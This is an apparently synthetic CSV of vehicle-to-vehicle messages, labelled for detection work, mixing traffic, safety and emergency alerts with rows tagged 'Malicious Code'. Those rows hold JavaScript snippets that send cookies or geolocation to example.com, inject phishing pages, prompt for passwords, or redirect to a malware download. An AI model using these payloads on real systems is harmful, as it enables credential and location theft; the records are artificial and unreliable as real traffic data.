Timestamp,Vehicle_ID,Vehicle_Type,Latitude,Longitude,Speed,Message_Type,Message_Content,Weather_Condition
35:54.1,vehicle_94,truck,47.6251721,-122.303692,62.95451001,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",snowy
36:53.1,vehicle_80,truck,47.6830422,-122.3764029,0.946757287,Traffic Update,Traffic is at a standstill on the northbound lanes of State Highway 1.,rainy
54:23.5,vehicle_87,motorcycle,47.64552623,-122.3828032,97.83863936,Traffic Update,Gridlock on State Highway 1.,snowy
38:40.0,vehicle_33,motorcycle,47.67297583,-122.3872776,35.97044249,Traffic Update,Gridlock on Lane.,foggy
23:44.0,vehicle_23,motorcycle,47.69553828,-122.3014838,64.73831654,Emergency Update,Civil unrest in your region.,foggy
02:18.3,vehicle_39,motorcycle,47.62737592,-122.3369799,96.2565617,Safety,Look out for Icy roads.,foggy
50:31.5,vehicle_20,motorcycle,47.62007843,-122.3893157,51.24467668,Safety,Beware of Inclement weather.,clear
41:50.8,vehicle_33,car,47.67739559,-122.3666201,33.03292953,Emergency Update,Terrorist attack in your immediate area.,rainy
45:04.1,vehicle_54,car,47.60447366,-122.3364194,41.92784225,Emergency Update,Detour due to emergency in your region.,snowy
31:21.0,vehicle_67,truck,47.60617877,-122.3115131,86.33161869,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
03:36.4,vehicle_27,motorcycle,47.67460036,-122.3700753,75.58537614,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,snowy
33:58.1,vehicle_69,truck,47.64775874,-122.3795273,48.106166,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,snowy
40:07.3,vehicle_17,motorcycle,47.62444067,-122.3018104,3.394630927,Traffic Update,Traffic is at a standstill on the northbound lanes of Provincial Highway 1.,foggy
14:20.5,vehicle_40,car,47.67115576,-122.3385341,119.8471828,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,snowy
20:20.9,vehicle_92,car,47.69412313,-122.3549485,53.71682747,Emergency Update,Traffic accident in your immediate area.,rainy
07:35.6,vehicle_80,motorcycle,47.6619111,-122.3102733,23.95306344,Safety,Avoid Power outages.,snowy
40:49.2,vehicle_28,car,47.60680557,-122.3941608,3.47036153,Traffic Update,Stop-and-go traffic on I-95.,foggy
16:35.7,vehicle_74,car,47.69863412,-122.3731488,87.72356529,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
36:21.0,vehicle_50,truck,47.64610418,-122.3064615,57.67833731,Malicious Code,"prompt('Enter your password:', 'Password Required');",foggy
53:23.2,vehicle_82,truck,47.67065925,-122.3657232,28.77581907,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,rainy
41:01.2,vehicle_37,motorcycle,47.61296952,-122.3211356,60.32397084,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
35:54.1,vehicle_22,car,47.61857414,-122.3291276,84.04785979,Emergency Update,Head-on collision in your locality.,clear
02:54.2,vehicle_59,truck,47.66717577,-122.3232584,53.81538723,Emergency Update,Head-on collision in your immediate area.,foggy
02:08.8,vehicle_67,car,47.68652241,-122.3723346,69.15171629,Traffic Update,Tailback on County Road 1.,rainy
12:32.4,vehicle_67,motorcycle,47.62027555,-122.3473516,61.34247927,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,snowy
16:27.3,vehicle_68,car,47.67803136,-122.3684224,90.34924987,Traffic Update,Gridlock on US-101.,snowy
15:29.5,vehicle_39,car,47.60814344,-122.3944206,41.29479643,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
23:53.5,vehicle_0,truck,47.61279458,-122.3132999,105.3288225,Safety,Look out for Power outages.,rainy
48:24.5,vehicle_41,truck,47.61595363,-122.356016,3.862574582,Traffic Update,Tailback on A1.,rainy
11:04.6,vehicle_49,motorcycle,47.61957404,-122.3555019,47.00439771,Emergency Update,Detour due to emergency locally.,snowy
57:54.5,vehicle_95,car,47.63508872,-122.3298846,10.76285313,Traffic Update,Traffic is at a standstill on the northbound lanes of Highway 1.,foggy
49:31.8,vehicle_97,motorcycle,47.68818379,-122.312978,107.714109,Safety,Avoid Accidents.,clear
13:39.2,vehicle_76,motorcycle,47.64979758,-122.3663177,110.4013868,Traffic Update,Slow traffic on County Road 1.,rainy
47:40.7,vehicle_8,car,47.6956961,-122.3330392,118.8805375,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,rainy
16:16.8,vehicle_42,motorcycle,47.63735015,-122.3000267,56.2336827,Safety,Avoid Accidents.,snowy
49:53.4,vehicle_79,truck,47.65119887,-122.3392988,75.6381165,Safety,Beware of Accidents.,clear
04:19.1,vehicle_11,car,47.65769885,-122.3445935,32.29114329,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),rainy
22:33.3,vehicle_29,motorcycle,47.67233415,-122.3378239,65.54275183,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
18:52.3,vehicle_57,car,47.60428569,-122.3729814,26.22189933,Traffic Update,Gridlock on I-95.,clear
11:46.4,vehicle_21,truck,47.6599997,-122.3284302,116.8336124,Traffic Update,Tailback on Local Street.,rainy
04:19.3,vehicle_99,car,47.66930395,-122.3652547,102.0245251,Safety,Exercise caution regarding Inclement weather.,clear
38:35.9,vehicle_9,car,47.67708476,-122.3634452,90.19058546,Safety,Stay informed about Debris.,rainy
25:26.9,vehicle_93,truck,47.63402396,-122.3520293,23.98048979,Safety,Look out for Construction zones.,snowy
50:49.0,vehicle_38,truck,47.60394571,-122.3137283,67.46459746,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
17:05.9,vehicle_38,motorcycle,47.63944376,-122.3614182,69.25987326,Emergency Update,Natural disaster in your region.,rainy
11:39.8,vehicle_53,truck,47.65975423,-122.3941338,7.926978265,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,clear
18:33.5,vehicle_0,car,47.60514634,-122.3720342,12.80774959,Traffic Update,Stop-and-go traffic on City Road 1.,clear
26:59.6,vehicle_68,motorcycle,47.62065638,-122.3126492,100.1576292,Emergency Update,Infrastructure collapse in your region.,foggy
32:36.1,vehicle_93,motorcycle,47.61840781,-122.3113933,51.78797791,Safety,Watch out for Inclement weather.,rainy
38:36.2,vehicle_31,truck,47.66661753,-122.3801147,111.3903162,Safety,Be cautious of Detours.,snowy
09:46.7,vehicle_31,motorcycle,47.66950951,-122.388204,30.97418448,Safety,Stay away from Spills.,rainy
51:33.7,vehicle_16,car,47.61107621,-122.3932547,13.51915572,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
43:55.2,vehicle_50,truck,47.65313219,-122.3456527,3.828446029,Emergency Update,Natural disaster in your locale.,snowy
10:01.1,vehicle_54,car,47.62659367,-122.3201168,56.12775652,Safety,Stay away from Uneven surfaces.,rainy
42:36.0,vehicle_37,truck,47.65389927,-122.3801925,49.50032287,Traffic Update,Stop-and-go traffic on Highway 1.,clear
58:59.8,vehicle_60,truck,47.60198435,-122.3863004,44.4035414,Emergency Update,Natural disaster in your surrounding area.,snowy
24:11.8,vehicle_20,motorcycle,47.64108388,-122.3468507,6.815510521,Emergency Update,Infrastructure collapse in your locality.,foggy
15:49.9,vehicle_24,motorcycle,47.62137191,-122.3495912,25.04499908,Traffic Update,Stop-and-go traffic on Highway 1.,clear
37:00.6,vehicle_74,car,47.66739835,-122.3355728,15.66676104,Safety,Take precautions against Spills.,foggy
13:01.1,vehicle_98,car,47.62760798,-122.395021,9.302400807,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
22:30.8,vehicle_44,truck,47.61247085,-122.3030418,84.82528126,Safety,Avoid Low visibility due to fog or smoke.,snowy
49:59.5,vehicle_71,truck,47.63427325,-122.3765504,82.4383516,Emergency Update,Natural disaster in your locality.,foggy
50:24.4,vehicle_73,motorcycle,47.6896124,-122.3865157,49.95138501,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
56:49.2,vehicle_14,motorcycle,47.64436328,-122.3377188,2.915890468,Malicious Code,location.href = 'https://example.com/malware.exe';,clear
31:20.7,vehicle_93,car,47.67109245,-122.3836509,50.21097429,Emergency Update,Multi-vehicle accident nearby.,rainy
48:30.2,vehicle_36,car,47.63034344,-122.3932467,95.43206002,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
03:18.7,vehicle_44,truck,47.61526004,-122.3176191,20.26516549,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
16:35.4,vehicle_31,motorcycle,47.64751333,-122.3493799,65.4095031,Traffic Update,At-a-standstill traffic on Autostrada A1.,foggy
23:28.5,vehicle_20,motorcycle,47.60508848,-122.3683594,99.53318126,Safety,Be aware of Spills.,rainy
04:15.5,vehicle_9,car,47.6088696,-122.3708201,9.322889716,Traffic Update,Heavy congestion on State Highway 1.,snowy
04:02.1,vehicle_94,truck,47.67013761,-122.3281748,65.84370845,Emergency Update,Traffic diversion in your region.,foggy
00:04.9,vehicle_32,motorcycle,47.68755625,-122.3950259,70.30895836,Traffic Update,Traffic backup on Lane.,foggy
41:23.6,vehicle_85,motorcycle,47.64296978,-122.3044437,42.92644138,Emergency Update,Bridge collapse in your neighborhood.,foggy
45:46.4,vehicle_15,motorcycle,47.61939825,-122.3821127,81.20432999,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
23:39.8,vehicle_52,motorcycle,47.69463939,-122.3225411,31.49341072,Emergency Update,Traffic accident in your part of town.,snowy
53:30.0,vehicle_69,car,47.60394472,-122.3124595,72.05546518,Safety,Be aware of Wildlife crossing.,clear
59:14.0,vehicle_58,car,47.62846998,-122.3541887,57.93526069,Safety,Be alert to Power outages.,foggy
54:03.9,vehicle_92,motorcycle,47.66752868,-122.3158317,111.4282433,Traffic Update,Severe traffic congestion on County Road 1.,snowy
46:50.4,vehicle_55,car,47.6959546,-122.3222855,118.2254185,Traffic Update,Traffic backup on Highway 1.,foggy
50:53.4,vehicle_51,motorcycle,47.67534775,-122.3055414,53.15129279,Traffic Update,Traffic jam on Highway 1.,clear
33:35.2,vehicle_79,truck,47.64929672,-122.3462676,64.67663568,Traffic Update,Traffic backup on National Highway 1.,rainy
47:17.3,vehicle_23,motorcycle,47.60008907,-122.3338901,64.95728588,Malicious Code,"prompt('Enter your password:', 'Password Required');",foggy
49:56.8,vehicle_90,car,47.61230502,-122.3120793,92.24731779,Emergency Update,Traffic accident in your locale.,foggy
05:23.9,vehicle_55,motorcycle,47.61993389,-122.3192239,73.50351586,Safety,Watch out for Fallen trees.,foggy
37:36.4,vehicle_97,truck,47.69516131,-122.3745104,16.79949927,Traffic Update,Traffic bottleneck on County Road 1.,foggy
01:07.7,vehicle_70,motorcycle,47.61313566,-122.317593,94.98710021,Emergency Update,Detour due to emergency nearby.,rainy
54:39.0,vehicle_49,car,47.64735485,-122.3188118,67.50583192,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,snowy
27:13.8,vehicle_31,truck,47.69819697,-122.3762779,66.23874083,Traffic Update,Gridlock on Boulevard.,rainy
25:49.7,vehicle_69,car,47.64674221,-122.3060823,100.4286374,Safety,Exercise caution regarding Road construction.,clear
25:48.3,vehicle_56,motorcycle,47.65725951,-122.3660548,4.454507487,Safety,Be aware of Slippery roads due to rain or snow.,foggy
50:44.6,vehicle_82,motorcycle,47.68529281,-122.3818964,113.5152402,Emergency Update,Major traffic collision in your jurisdiction.,clear
43:23.7,vehicle_12,truck,47.64331487,-122.3479972,9.735954669,Traffic Update,Traffic backup on Local Street.,foggy
44:45.0,vehicle_84,truck,47.69546379,-122.3138555,108.584688,Emergency Update,Civil unrest locally.,foggy
15:13.0,vehicle_42,car,47.64663378,-122.3038177,46.96355631,Malicious Code,location.href = 'https://example.com/malware.exe';,snowy
59:22.6,vehicle_37,motorcycle,47.66348107,-122.3825758,70.13320286,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,clear
01:05.1,vehicle_42,motorcycle,47.65374375,-122.3677928,100.0837692,Emergency Update,Water crisis in your region.,clear
35:24.8,vehicle_16,car,47.62434526,-122.3952725,91.91390408,Emergency Update,Traffic accident in your vicinity.,foggy
06:40.5,vehicle_70,motorcycle,47.67245295,-122.3795488,110.0400447,Safety,Beware of Low visibility due to fog or smoke.,rainy
23:42.2,vehicle_72,motorcycle,47.66350711,-122.373092,25.43730136,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
38:36.1,vehicle_86,car,47.64135791,-122.3925269,100.2342917,Emergency Update,Bridge collapse in your jurisdiction.,rainy
08:16.7,vehicle_4,car,47.65677429,-122.3392598,30.54626499,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",foggy
30:10.7,vehicle_51,car,47.61752455,-122.3644304,8.869506313,Emergency Update,Infrastructure collapse in your locale.,snowy
21:07.4,vehicle_13,motorcycle,47.63029202,-122.337896,98.66631805,Safety,Be alert to Power outages.,clear
13:08.9,vehicle_93,truck,47.68866417,-122.3792675,35.40282403,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
02:09.4,vehicle_5,car,47.6866848,-122.3463883,96.2337317,Emergency Update,Evacuation order nearby.,foggy
21:19.6,vehicle_70,motorcycle,47.65920641,-122.3151865,112.4177974,Emergency Update,Head-on collision locally.,snowy
58:58.5,vehicle_21,car,47.60669237,-122.3471548,87.31225412,Safety,Take precautions against Inclement weather.,snowy
16:07.0,vehicle_46,truck,47.61475755,-122.3397468,34.97493734,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
13:41.8,vehicle_8,car,47.61520512,-122.3098839,91.70114307,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
14:08.6,vehicle_43,car,47.68020138,-122.314714,19.67396745,Traffic Update,Gridlock on US-101.,rainy
19:04.4,vehicle_10,car,47.64117884,-122.3018749,97.22621298,Safety,Look out for Potholes.,snowy
28:03.5,vehicle_86,motorcycle,47.68639787,-122.3153881,92.36688212,Traffic Update,Slow traffic on Drive.,foggy
10:44.8,vehicle_13,motorcycle,47.6458409,-122.3697455,89.86769431,Safety,Exercise caution regarding Road construction.,foggy
53:43.1,vehicle_92,truck,47.60838459,-122.3107443,48.53436825,Traffic Update,Traffic bottleneck on State Highway 1.,rainy
30:03.3,vehicle_77,truck,47.61184581,-122.3294567,34.42673362,Emergency Update,Traffic accident in your locality.,snowy
45:18.6,vehicle_41,motorcycle,47.60494288,-122.3244607,20.68077834,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
02:36.7,vehicle_45,car,47.60645538,-122.3026675,49.52561131,Emergency Update,Emergency traffic in your community.,clear
15:21.2,vehicle_37,car,47.6204662,-122.3647864,8.514038535,Traffic Update,Traffic bottleneck on Boulevard.,snowy
40:03.3,vehicle_91,motorcycle,47.63782393,-122.3021579,23.77298332,Safety,Exercise caution regarding Debris.,rainy
51:38.5,vehicle_73,truck,47.63399996,-122.3881267,15.72902486,Emergency Update,Major traffic collision in your region.,snowy
08:41.0,vehicle_2,motorcycle,47.66225459,-122.343623,57.05908692,Safety,Be cautious of Spills.,snowy
07:28.0,vehicle_19,truck,47.66399983,-122.3196944,56.03552278,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
39:31.1,vehicle_6,car,47.6668682,-122.3648016,59.03877717,Safety,Exercise caution regarding Spills.,snowy
16:20.0,vehicle_89,truck,47.61218269,-122.3732137,53.18078692,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,rainy
01:15.1,vehicle_98,motorcycle,47.62012139,-122.3512475,29.37622771,Safety,Be aware of Slippery roads due to rain or snow.,clear
51:47.6,vehicle_87,motorcycle,47.69496929,-122.3945259,112.5316274,Safety,Exercise caution regarding Icy roads.,clear
39:13.9,vehicle_42,truck,47.65948843,-122.3512548,77.28041812,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
